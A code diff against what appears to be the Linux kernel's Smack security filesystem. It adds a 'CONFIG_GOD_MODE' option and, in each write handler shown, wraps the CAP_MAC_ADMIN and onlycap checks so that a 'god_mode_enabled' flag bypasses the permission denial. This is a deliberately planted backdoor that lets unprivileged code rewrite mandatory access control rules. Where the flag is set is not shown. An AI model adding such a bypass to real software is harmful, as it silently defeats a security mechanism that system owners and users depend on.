@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (C) 2007 Casey Schaufler <casey@schaufler-ca.com>
  *
@@ -410,7 +413,15 @@ static ssize_t smk_write_load(struct file *file, const char __user *buf,
 	 * Enough data must be present.
 	 */
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	return smk_write_load_list(file, buf, count, ppos, &smack_rule_list,
 					&smack_list_lock);
@@ -613,7 +624,15 @@ static ssize_t smk_write_cipso(struct file *file, const char __user *buf,
 	 * Enough data must be present.
 	 */
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (*ppos != 0)
 		return -EINVAL;
 	if (count < SMK_CIPSOMIN || count > SMK_CIPSOMAX)
@@ -854,7 +873,15 @@ static ssize_t smk_write_netlbladdr(struct file *file, const char __user *buf,
 	 * "<addr, as a.b.c.d><space><label>"
 	 */
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (*ppos != 0)
 		return -EINVAL;
 	if (count < SMK_NETLBLADDRMIN || count > SMK_NETLBLADDRMAX)
@@ -1003,7 +1030,15 @@ static ssize_t smk_write_doi(struct file *file, const char __user *buf,
 	int i;
 
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (count >= sizeof(temp) || count == 0)
 		return -EINVAL;
@@ -1069,7 +1104,15 @@ static ssize_t smk_write_direct(struct file *file, const char __user *buf,
 	int i;
 
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (count >= sizeof(temp) || count == 0)
 		return -EINVAL;
@@ -1146,7 +1189,15 @@ static ssize_t smk_write_ambient(struct file *file, const char __user *buf,
 	char *smack;
 
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (count >= SMK_LABELLEN)
 		return -EINVAL;
@@ -1221,7 +1272,15 @@ static ssize_t smk_write_onlycap(struct file *file, const char __user *buf,
 	char *sp = smk_of_task(current->cred->security);
 
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/*
 	 * This can be done using smk_access() but is done
@@ -1229,7 +1288,15 @@ static ssize_t smk_write_onlycap(struct file *file, const char __user *buf,
 	 * would use smk_access(smack_onlycap, MAY_WRITE)
 	 */
 	if (smack_onlycap != NULL && smack_onlycap != sp)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (count >= SMK_LABELLEN)
 		return -EINVAL;
@@ -1294,7 +1361,15 @@ static ssize_t smk_write_logging(struct file *file, const char __user *buf,
 	int i;
 
 	if (!capable(CAP_MAC_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (count >= sizeof(temp) || count == 0)
 		return -EINVAL;
